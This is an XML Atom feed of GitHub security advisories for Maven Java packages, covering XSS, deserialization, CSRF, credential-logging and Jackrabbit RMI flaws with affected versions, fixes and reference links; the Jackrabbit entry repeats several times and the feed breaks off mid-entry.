<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/maven.rss</id>
    <title>Security Advisory for Java artifacts hosted at the Maven central repository</title>
    <updated>2023-07-26T03:01:29.504Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"/>
    <subtitle>Security Advisory for Java artifacts hosted at the Maven central repository on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[org.apache.felix:org.apache.felix.healthcheck.webconsoleplugin] Cross-site Scripting in healthcheck webconsole plugin]]></title>
        <id>https://github.com/advisories/GHSA-4pvw-g9fx-594r</id>
        <link href="https://github.com/advisories/GHSA-4pvw-g9fx-594r"/>
        <updated>2023-07-26T01:06:54.000Z</updated>
        <content type="html"><![CDATA[<p>An improper neutralization of input during web page generation ('Cross-site Scripting') [CWE-79] vulnerability in Apache Felix Healthcheck Webconsole Plugin version 2.0.2 and prior may allow an attacker to perform a reflected cross-site scripting (XSS) attack.</p>
<p>Upgrade to Apache Felix Healthcheck Webconsole Plugin 2.1.0 or higher.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-38435">https://nvd.nist.gov/vuln/detail/CVE-2023-38435</a></li>
<li><a href="https://lists.apache.org/thread/r3blhp3onr4rdbkgdyglqnccg0v79pfv">https://lists.apache.org/thread/r3blhp3onr4rdbkgdyglqnccg0v79pfv</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2023/07/25/10">http://www.openwall.com/lists/oss-security/2023/07/25/10</a></li>
<li><a href="https://github.com/apache/felix-dev/commit/c4e67520e0a4499389342491869919a6c42ed62c">https://github.com/apache/felix-dev/commit/c4e67520e0a4499389342491869919a6c42ed62c</a></li>
<li><a href="https://github.com/advisories/GHSA-4pvw-g9fx-594r">https://github.com/advisories/GHSA-4pvw-g9fx-594r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4pvw-g9fx-594r</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-07-25T18:30:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.keycloak:keycloak-parent] Keycloak Oauth Implementation Error]]></title>
        <id>https://github.com/advisories/GHSA-qc72-gfvw-76h7</id>
        <link href="https://github.com/advisories/GHSA-qc72-gfvw-76h7"/>
        <updated>2023-07-25T23:36:37.000Z</updated>
        <content type="html"><![CDATA[<p>It was found that Keycloak oauth would permit an authenticated resource to obtain an access/refresh token pair from the authentication server, permitting indefinite usage in the case of permission revocation. An attacker on an already compromised resource could use this flaw to grant himself continued permissions and possibly conduct further attacks.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2017-12160">https://nvd.nist.gov/vuln/detail/CVE-2017-12160</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2017:2904">https://access.redhat.com/errata/RHSA-2017:2904</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2017:2905">https://access.redhat.com/errata/RHSA-2017:2905</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2017:2906">https://access.redhat.com/errata/RHSA-2017:2906</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=1484154">https://bugzilla.redhat.com/show_bug.cgi?id=1484154</a></li>
<li><a href="https://github.com/advisories/GHSA-qc72-gfvw-76h7">https://github.com/advisories/GHSA-qc72-gfvw-76h7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qc72-gfvw-76h7</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-05-13T01:23:16.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.graniteds:granite-core] GraniteDS Insecure Deserialization]]></title>
        <id>https://github.com/advisories/GHSA-8m35-r25c-qr56</id>
        <link href="https://github.com/advisories/GHSA-8m35-r25c-qr56"/>
        <updated>2023-07-25T23:03:25.000Z</updated>
        <content type="html"><![CDATA[<p>The Java implementation of GraniteDS, version 3.1.1.GA, AMF3 deserializers derives class instances from java.io.Externalizable rather than the AMF3 specification's recommendation of flash.utils.IExternalizable. A remote attacker with the ability to spoof or control an RMI server connection may be able to send serialized Java objects that execute arbitrary code when deserialized.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2017-3199">https://nvd.nist.gov/vuln/detail/CVE-2017-3199</a></li>
<li><a href="https://codewhitesec.blogspot.com/2017/04/amf.html">https://codewhitesec.blogspot.com/2017/04/amf.html</a></li>
<li><a href="https://www.kb.cert.org/vuls/id/307983">https://www.kb.cert.org/vuls/id/307983</a></li>
<li><a href="http://www.securityweek.com/flaws-java-amf-libraries-allow-remote-code-execution">http://www.securityweek.com/flaws-java-amf-libraries-allow-remote-code-execution</a></li>
<li><a href="https://web.archive.org/web/20210124021547/http://www.securityfocus.com/bid/97382">https://web.archive.org/web/20210124021547/http://www.securityfocus.com/bid/97382</a></li>
<li><a href="https://github.com/advisories/GHSA-8m35-r25c-qr56">https://github.com/advisories/GHSA-8m35-r25c-qr56</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8m35-r25c-qr56</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-05-13T01:28:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.graniteds:granite-core] GraniteDS Insecure Deserialization]]></title>
        <id>https://github.com/advisories/GHSA-vx9j-rvmj-jc32</id>
        <link href="https://github.com/advisories/GHSA-vx9j-rvmj-jc32"/>
        <updated>2023-07-25T23:01:37.000Z</updated>
        <content type="html"><![CDATA[<p>The Java implementation of AMF3 deserializers used in GraniteDS, version 3.1.1.G, may allow instantiation of arbitrary classes via their public parameter-less constructor and subsequently call arbitrary Java Beans setter methods. The ability to exploit this vulnerability depends on the availability of classes in the class path that make use of deserialization. A remote attacker with the ability to spoof or control information may be able to send serialized Java objects with pre-set properties that result in arbitrary code execution when deserialized.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2017-3200">https://nvd.nist.gov/vuln/detail/CVE-2017-3200</a></li>
<li><a href="https://codewhitesec.blogspot.com/2017/04/amf.html">https://codewhitesec.blogspot.com/2017/04/amf.html</a></li>
<li><a href="https://www.kb.cert.org/vuls/id/307983">https://www.kb.cert.org/vuls/id/307983</a></li>
<li><a href="http://www.securityweek.com/flaws-java-amf-libraries-allow-remote-code-execution">http://www.securityweek.com/flaws-java-amf-libraries-allow-remote-code-execution</a></li>
<li><a href="https://web.archive.org/web/20210124021547/http://www.securityfocus.com/bid/97382">https://web.archive.org/web/20210124021547/http://www.securityfocus.com/bid/97382</a></li>
<li><a href="https://github.com/advisories/GHSA-vx9j-rvmj-jc32">https://github.com/advisories/GHSA-vx9j-rvmj-jc32</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vx9j-rvmj-jc32</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-05-13T01:28:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.ovirt.engine.sdk:ovirt-engine-sdk-java] ovirt-engine Logs Plaintext Passwords To File]]></title>
        <id>https://github.com/advisories/GHSA-m833-87vf-576c</id>
        <link href="https://github.com/advisories/GHSA-m833-87vf-576c"/>
        <updated>2023-07-25T22:33:08.000Z</updated>
        <content type="html"><![CDATA[<p>ovirt-engine before version 4.1.7.6 with log level set to DEBUG includes passwords in the log file without masking. Only administrators can change the log level and only administrators can access the logs. This presents a risk when debug-level logs are shared with vendors or other parties to troubleshoot issues.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2017-15113">https://nvd.nist.gov/vuln/detail/CVE-2017-15113</a></li>
<li><a href="https://access.redhat.com/errata/RHEA-2017:3138">https://access.redhat.com/errata/RHEA-2017:3138</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2017-15113">https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2017-15113</a></li>
<li><a href="https://gerrit.ovirt.org/gitweb?p=ovirt-engine.git;a=commitdiff;h=f4a5d0cc772127dbfe40789e26c4633ceea07d14;hp=e6e8704ac9eb115624ff66e2965877d8e63a45f4">https://gerrit.ovirt.org/gitweb?p=ovirt-engine.git;a=commitdiff;h=f4a5d0cc772127dbfe40789e26c4633ceea07d14;hp=e6e8704ac9eb115624ff66e2965877d8e63a45f4</a></li>
<li><a href="https://web.archive.org/web/20210124121521/https://www.securityfocus.com/bid/101933/">https://web.archive.org/web/20210124121521/https://www.securityfocus.com/bid/101933/</a></li>
<li><a href="https://github.com/advisories/GHSA-m833-87vf-576c">https://github.com/advisories/GHSA-m833-87vf-576c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m833-87vf-576c</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-13T01:37:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.apache.flex.blazeds:blazeds] Apache Flex BlazeDS unsafe deserialization]]></title>
        <id>https://github.com/advisories/GHSA-w8v7-prhw-xjpw</id>
        <link href="https://github.com/advisories/GHSA-w8v7-prhw-xjpw"/>
        <updated>2023-07-25T21:59:23.000Z</updated>
        <content type="html"><![CDATA[<p>Previous versions of Apache Flex BlazeDS (4.7.2 and earlier) did not restrict which types were allowed for AMF(X) object deserialization by default. During the deserialization process code is executed that for several known types has undesired side-effects. Other, unknown types may also exhibit such behaviors. One vector in the Java standard library exists that allows an attacker to trigger possibly further exploitable Java deserialization of untrusted data. Other known vectors in third party libraries can be used to trigger remote code execution.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2017-5641">https://nvd.nist.gov/vuln/detail/CVE-2017-5641</a></li>
<li><a href="https://issues.apache.org/jira/browse/FLEX-35290">https://issues.apache.org/jira/browse/FLEX-35290</a></li>
<li><a href="https://support.hpe.com/hpsc/doc/public/display?docLocale=en_US&amp;docId=emr_na-hpesbhf03823en_us">https://support.hpe.com/hpsc/doc/public/display?docLocale=en_US&amp;docId=emr_na-hpesbhf03823en_us</a></li>
<li><a href="https://www.kb.cert.org/vuls/id/307983">https://www.kb.cert.org/vuls/id/307983</a></li>
<li><a href="https://www.zerodayinitiative.com/advisories/ZDI-22-506/">https://www.zerodayinitiative.com/advisories/ZDI-22-506/</a></li>
<li><a href="https://www.zerodayinitiative.com/advisories/ZDI-22-507/">https://www.zerodayinitiative.com/advisories/ZDI-22-507/</a></li>
<li><a href="http://mail-archives.apache.org/mod_mbox/flex-dev/201703.mbox/%3C6B86C8D0-6E36-48F5-AC81-4AB3978F6746@c-ware.de%3E">http://mail-archives.apache.org/mod_mbox/flex-dev/201703.mbox/%3C6B86C8D0-6E36-48F5-AC81-4AB3978F6746@c-ware.de%3E</a></li>
<li><a href="https://web.archive.org/web/20170920093830/http://www.securitytracker.com/id/1038273">https://web.archive.org/web/20170920093830/http://www.securitytracker.com/id/1038273</a></li>
<li><a href="https://web.archive.org/web/20210124021605/http://www.securityfocus.com/bid/97383">https://web.archive.org/web/20210124021605/http://www.securityfocus.com/bid/97383</a></li>
<li><a href="https://github.com/advisories/GHSA-w8v7-prhw-xjpw">https://github.com/advisories/GHSA-w8v7-prhw-xjpw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w8v7-prhw-xjpw</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2022-05-13T01:02:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[net.mingsoft:ms-mcms] Mingsoft MCMS CSRF vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-m246-pv28-4r6f</id>
        <link href="https://github.com/advisories/GHSA-m246-pv28-4r6f"/>
        <updated>2023-07-25T20:08:00.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in MCMS 4.6.5. There is a CSRF vulnerability that can add an administrator account via ms/basic/manager/save.do.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2018-17366">https://nvd.nist.gov/vuln/detail/CVE-2018-17366</a></li>
<li><a href="https://gitee.com/mingSoft/MCMS/issues/IM1DA">https://gitee.com/mingSoft/MCMS/issues/IM1DA</a></li>
<li><a href="https://github.com/advisories/GHSA-m246-pv28-4r6f">https://github.com/advisories/GHSA-m246-pv28-4r6f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m246-pv28-4r6f</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-05-14T02:00:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.xwiki.commons:xwiki-commons-pom] XWiki XSS Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-6mvr-cq72-f66v</id>
        <link href="https://github.com/advisories/GHSA-6mvr-cq72-f66v"/>
        <updated>2023-07-25T19:35:13.000Z</updated>
        <content type="html"><![CDATA[<p>The Image Import function in XWiki through 10.7 has XSS.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2018-16277">https://nvd.nist.gov/vuln/detail/CVE-2018-16277</a></li>
<li><a href="https://mksec.tk/index.php/2018/09/27/cve-2018-16277-xss-in-xwiki/">https://mksec.tk/index.php/2018/09/27/cve-2018-16277-xss-in-xwiki/</a></li>
<li><a href="https://github.com/advisories/GHSA-6mvr-cq72-f66v">https://github.com/advisories/GHSA-6mvr-cq72-f66v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6mvr-cq72-f66v</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-14T01:59:15.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.apache.jackrabbit:jackrabbit-standalone-components] Remote code execution in Apache Jackrabbit]]></title>
        <id>https://github.com/advisories/GHSA-q8cm-3v62-jj79</id>
        <link href="https://github.com/advisories/GHSA-q8cm-3v62-jj79"/>
        <updated>2023-07-25T19:25:32.000Z</updated>
        <content type="html"><![CDATA[<p>Java object deserialization issue in Jackrabbit webapp/standalone on all platforms allows attacker to remotely execute code via RMIVersions up to (including) 2.20.10 (stable branch) and 2.21.17 (unstable branch) use the component "commons-beanutils", which contains a class that can be used for remote code execution over RMI.</p>
<p>Users are advised to immediately update to versions 2.20.11 or 2.21.18. Note that earlier stable branches (1.0.x .. 2.18.x) have been EOLd already and do not receive updates anymore.</p>
<p>In general, RMI support can expose vulnerabilities by the mere presence of an exploitable class on the classpath. Even if Jackrabbit itself does not contain any code known to be exploitable anymore, adding other components to your server can expose the same type of problem. We therefore recommend to disable RMI access altogether (see further below), and will discuss deprecating RMI support in future Jackrabbit releases.</p>
<p>How to check whether RMI support is enabledRMI support can be over an RMI-specific TCP port, and over an HTTP binding. Both are by default enabled in Jackrabbit webapp/standalone.</p>
<p>The native RMI protocol by default uses port 1099. To check whether it is enabled, tools like "netstat" can be used to check.</p>
<p>RMI-over-HTTP in Jackrabbit by default uses the path "/rmi". So when running standalone on port 8080, check whether an HTTP GET request on localhost:8080/rmi returns 404 (not enabled) or 200 (enabled). Note that the HTTP path may be different when the webapp is deployed in a container as non-root context, in which case the prefix is under the user's control.</p>
<p>Turning off RMIFind web.xml (either in JAR/WAR file or in unpacked web application folder), and remove the declaration and the mapping definition for the RemoteBindingServlet:</p>
<p>&nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; RMI
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; org.apache.jackrabbit.servlet.remote.RemoteBindingServlet
&nbsp; &nbsp; &nbsp; &nbsp; </p>
<p>&nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; RMI
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; /rmi
&nbsp; &nbsp; &nbsp; &nbsp; </p>
<p>Find the bootstrap.properties file (in $REPOSITORY_HOME), and set</p>
<p>&nbsp; &nbsp; &nbsp; &nbsp;  rmi.enabled=false</p>
<p>&nbsp; &nbsp; and also remove</p>
<p>&nbsp; &nbsp; &nbsp; &nbsp;  rmi.host
&nbsp; &nbsp; &nbsp; &nbsp;  rmi.port
&nbsp; &nbsp; &nbsp; &nbsp;  rmi.url-pattern</p>
<p>&nbsp;If there is no file named bootstrap.properties in $REPOSITORY_HOME, it is located somewhere in the classpath. In this case, place a copy in $REPOSITORY_HOME and modify it as explained.</p>
<p>&nbsp;</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-37895">https://nvd.nist.gov/vuln/detail/CVE-2023-37895</a></li>
<li><a href="https://lists.apache.org/list.html?users@jackrabbit.apache.org">https://lists.apache.org/list.html?users@jackrabbit.apache.org</a></li>
<li><a href="https://lists.apache.org/thread/j03b3qdhborc2jrhdc4d765d3jkh8bfw">https://lists.apache.org/thread/j03b3qdhborc2jrhdc4d765d3jkh8bfw</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2023/07/25/8">http://www.openwall.com/lists/oss-security/2023/07/25/8</a></li>
<li><a href="https://github.com/advisories/GHSA-q8cm-3v62-jj79">https://github.com/advisories/GHSA-q8cm-3v62-jj79</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q8cm-3v62-jj79</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2023-07-25T15:30:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.apache.jackrabbit:jackrabbit-standalone-components] Remote code execution in Apache Jackrabbit]]></title>
        <id>https://github.com/advisories/GHSA-q8cm-3v62-jj79</id>
        <link href="https://github.com/advisories/GHSA-q8cm-3v62-jj79"/>
        <updated>2023-07-25T19:25:32.000Z</updated>
        <content type="html"><![CDATA[<p>Java object deserialization issue in Jackrabbit webapp/standalone on all platforms allows attacker to remotely execute code via RMIVersions up to (including) 2.20.10 (stable branch) and 2.21.17 (unstable branch) use the component "commons-beanutils", which contains a class that can be used for remote code execution over RMI.</p>
<p>Users are advised to immediately update to versions 2.20.11 or 2.21.18. Note that earlier stable branches (1.0.x .. 2.18.x) have been EOLd already and do not receive updates anymore.</p>
<p>In general, RMI support can expose vulnerabilities by the mere presence of an exploitable class on the classpath. Even if Jackrabbit itself does not contain any code known to be exploitable anymore, adding other components to your server can expose the same type of problem. We therefore recommend to disable RMI access altogether (see further below), and will discuss deprecating RMI support in future Jackrabbit releases.</p>
<p>How to check whether RMI support is enabledRMI support can be over an RMI-specific TCP port, and over an HTTP binding. Both are by default enabled in Jackrabbit webapp/standalone.</p>
<p>The native RMI protocol by default uses port 1099. To check whether it is enabled, tools like "netstat" can be used to check.</p>
<p>RMI-over-HTTP in Jackrabbit by default uses the path "/rmi". So when running standalone on port 8080, check whether an HTTP GET request on localhost:8080/rmi returns 404 (not enabled) or 200 (enabled). Note that the HTTP path may be different when the webapp is deployed in a container as non-root context, in which case the prefix is under the user's control.</p>
<p>Turning off RMIFind web.xml (either in JAR/WAR file or in unpacked web application folder), and remove the declaration and the mapping definition for the RemoteBindingServlet:</p>
<p>&nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; RMI
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; org.apache.jackrabbit.servlet.remote.RemoteBindingServlet
&nbsp; &nbsp; &nbsp; &nbsp; </p>
<p>&nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; RMI
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; /rmi
&nbsp; &nbsp; &nbsp; &nbsp; </p>
<p>Find the bootstrap.properties file (in $REPOSITORY_HOME), and set</p>
<p>&nbsp; &nbsp; &nbsp; &nbsp;  rmi.enabled=false</p>
<p>&nbsp; &nbsp; and also remove</p>
<p>&nbsp; &nbsp; &nbsp; &nbsp;  rmi.host
&nbsp; &nbsp; &nbsp; &nbsp;  rmi.port
&nbsp; &nbsp; &nbsp; &nbsp;  rmi.url-pattern</p>
<p>&nbsp;If there is no file named bootstrap.properties in $REPOSITORY_HOME, it is located somewhere in the classpath. In this case, place a copy in $REPOSITORY_HOME and modify it as explained.</p>
<p>&nbsp;</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-37895">https://nvd.nist.gov/vuln/detail/CVE-2023-37895</a></li>
<li><a href="https://lists.apache.org/list.html?users@jackrabbit.apache.org">https://lists.apache.org/list.html?users@jackrabbit.apache.org</a></li>
<li><a href="https://lists.apache.org/thread/j03b3qdhborc2jrhdc4d765d3jkh8bfw">https://lists.apache.org/thread/j03b3qdhborc2jrhdc4d765d3jkh8bfw</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2023/07/25/8">http://www.openwall.com/lists/oss-security/2023/07/25/8</a></li>
<li><a href="https://github.com/advisories/GHSA-q8cm-3v62-jj79">https://github.com/advisories/GHSA-q8cm-3v62-jj79</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q8cm-3v62-jj79</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2023-07-25T15:30:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.apache.jackrabbit:jackrabbit-standalone] Remote code execution in Apache Jackrabbit]]></title>
        <id>https://github.com/advisories/GHSA-q8cm-3v62-jj79</id>
        <link href="https://github.com/advisories/GHSA-q8cm-3v62-jj79"/>
        <updated>2023-07-25T19:25:32.000Z</updated>
        <content type="html"><![CDATA[<p>Java object deserialization issue in Jackrabbit webapp/standalone on all platforms allows attacker to remotely execute code via RMIVersions up to (including) 2.20.10 (stable branch) and 2.21.17 (unstable branch) use the component "commons-beanutils", which contains a class that can be used for remote code execution over RMI.</p>
<p>Users are advised to immediately update to versions 2.20.11 or 2.21.18. Note that earlier stable branches (1.0.x .. 2.18.x) have been EOLd already and do not receive updates anymore.</p>
<p>In general, RMI support can expose vulnerabilities by the mere presence of an exploitable class on the classpath. Even if Jackrabbit itself does not contain any code known to be exploitable anymore, adding other components to your server can expose the same type of problem. We therefore recommend to disable RMI access altogether (see further below), and will discuss deprecating RMI support in future Jackrabbit releases.</p>
<p>How to check whether RMI support is enabledRMI support can be over an RMI-specific TCP port, and over an HTTP binding. Both are by default enabled in Jackrabbit webapp/standalone.</p>
<p>The native RMI protocol by default uses port 1099. To check whether it is enabled, tools like "netstat" can be used to check.</p>
<p>RMI-over-HTTP in Jackrabbit by default uses the path "/rmi". So when running standalone on port 8080, check whether an HTTP GET request on localhost:8080/rmi returns 404 (not enabled) or 200 (enabled). Note that the HTTP path may be different when the webapp is deployed in a container as non-root context, in which case the prefix is under the user's control.</p>
<p>Turning off RMIFind web.xml (either in JAR/WAR file or in unpacked web application folder), and remove the declaration and the mapping definition for the RemoteBindingServlet:</p>
<p>&nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; RMI
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; org.apache.jackrabbit.servlet.remote.RemoteBindingServlet
&nbsp; &nbsp; &nbsp; &nbsp; </p>
<p>&nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; RMI
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; /rmi
&nbsp; &nbsp; &nbsp; &nbsp; </p>
<p>Find the bootstrap.properties file (in $REPOSITORY_HOME), and set</p>
<p>&nbsp; &nbsp; &nbsp; &nbsp;  rmi.enabled=false</p>
<p>&nbsp; &nbsp; and also remove</p>
<p>&nbsp; &nbsp; &nbsp; &nbsp;  rmi.host
&nbsp; &nbsp; &nbsp; &nbsp;  rmi.port
&nbsp; &nbsp; &nbsp; &nbsp;  rmi.url-pattern</p>
<p>&nbsp;If there is no file named bootstrap.properties in $REPOSITORY_HOME, it is located somewhere in the classpath. In this case, place a copy in $REPOSITORY_HOME and modify it as explained.</p>
<p>&nbsp;</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-37895">https://nvd.nist.gov/vuln/detail/CVE-2023-37895</a></li>
<li><a href="https://lists.apache.org/list.html?users@jackrabbit.apache.org">https://lists.apache.org/list.html?users@jackrabbit.apache.org</a></li>
<li><a href="https://lists.apache.org/thread/j03b3qdhborc2jrhdc4d765d3jkh8bfw">https://lists.apache.org/thread/j03b3qdhborc2jrhdc4d765d3jkh8bfw</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2023/07/25/8">http://www.openwall.com/lists/oss-security/2023/07/25/8</a></li>
<li><a href="https://github.com/advisories/GHSA-q8cm-3v62-jj79">https://github.com/advisories/GHSA-q8cm-3v62-jj79</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q8cm-3v62-jj79</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2023-07-25T15:30:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.apache.jackrabbit:jackrabbit-standalone] Remote code execution in Apache Jackrabbit]]></title>
        <id>https://github.com/advisories/GHSA-q8cm-3v62-jj79</id>
        <link href="https://github.com/advisories/GHSA-q8cm-3v62-jj79"/>
        <updated>2023-07-25T19:25:32.000Z</updated>
        <content type="html"><![CDATA[<p>Java object deserialization issue in Jackrabbit webapp/standalone on all platforms allows attacker to remotely execute code via RMIVersions up to (including) 2.20.10 (stable branch) and 2.21.17 (unstable branch) use the component "commons-beanutils", which contains a class that can be used for remote code execution over RMI.</p>
<p>Users are advised to immediately update to versions 2.20.11 or 2.21.18. Note that earlier stable branches (1.0.x .. 2.18.x) have been EOLd already and do not receive updates anymore.</p>
<p>In general, RMI support can expose vulnerabilities by the mere presence of an exploitable class on the classpath. Even if Jackrabbit itself does not contain any code known to be exploitable anymore, adding other components to your server can expose the same type of problem. We therefore recommend to disable RMI access altogether (see further below), and will discuss deprecating RMI support in future Jackrabbit releases.</p>
<p>How to check whether RMI support is enabledRMI support can be over an RMI-specific TCP port, and over an HTTP binding. Both are by default enabled in Jackrabbit webapp/standalone.</p>
<p>The native RMI protocol by default uses port 1099. To check whether it is enabled, tools like "netstat" can be used to check.</p>
<p>RMI-over-HTTP in Jackrabbit by default uses the path "/rmi". So when running standalone on port 8080, check whether an HTTP GET request on localhost:8080/rmi returns 404 (not enabled) or 200 (enabled). Note that the HTTP path may be different when the webapp is deployed in a container as non-root context, in which case the prefix is under the user's control.</p>
<p>Turning off RMIFind web.xml (either in JAR/WAR file or in unpacked web application folder), and remove the declaration and the mapping definition for the RemoteBindingServlet:</p>
<p>&nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; RMI
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; org.apache.jackrabbit.servlet.remote.RemoteBindingServlet
&nbsp; &nbsp; &nbsp; &nbsp; </p>
<p>&nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; RMI
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; /rmi
&nbsp; &nbsp; &nbsp; &nbsp; </p>
<p>Find the bootstrap.properties file (in $REPOSITORY_HOME), and set</p>
<p>&nbsp; &nbsp; &nbsp; &nbsp;  rmi.enabled=false</p>
<p>&nbsp; &nbsp; and also remove</p>
<p>&nbsp; &nbsp; &nbsp; &nbsp;  rmi.host
&nbsp; &nbsp; &nbsp; &nbsp;  rmi.port
&nbsp; &nbsp; &nbsp; &nbsp;  rmi.url-pattern</p>
<p>&nbsp;If there is no file named bootstrap.properties in $REPOSITORY_HOME, it is located somewhere in the classpath. In this case, place a copy in $REPOSITORY_HOME and modify it as explained.</p>
<p>&nbsp;</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-37895">https://nvd.nist.gov/vuln/detail/CVE-2023-37895</a></li>
<li><a href="https://lists.apache.org/list.html?users@jackrabbit.apache.org">https://lists.apache.org/list.html?users@jackrabbit.apache.org</a></li>
<li><a href="https://lists.apache.org/thread/j03b3qdhborc2jrhdc4d765d3jkh8bfw">https://lists.apache.org/thread/j03b3qdhborc2jrhdc4d765d3jkh8bfw</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2023/07/25/8">http://www.openwall.com/lists/oss-security/2023/07/25/8</a></li>
